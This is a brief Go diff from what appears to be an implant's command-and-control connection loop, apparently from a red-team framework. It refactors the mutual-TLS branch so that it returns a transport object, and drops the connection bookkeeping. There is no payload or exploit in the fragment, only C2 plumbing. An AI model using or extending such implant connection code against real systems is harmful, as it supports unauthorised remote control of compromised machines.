@@ -133,16 +133,14 @@ func StartConnectionLoop() *Connection {
 		// *** MTLS ***
 		// {{if .Config.MTLSc2Enabled}}
 		case "mtls":
-			connection, err = mtlsConnect(uri)
+			transport, err := newTransportMTLS(uri)
 			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
+				return transport.C2
+
 			}
 			// {{if .Config.Debug}}
 			log.Printf("[mtls] Connection failed %s", err)
 			// {{end}}
-			connectionAttempts++
 			// {{end}}  - MTLSc2Enabled
 
 		case "https":
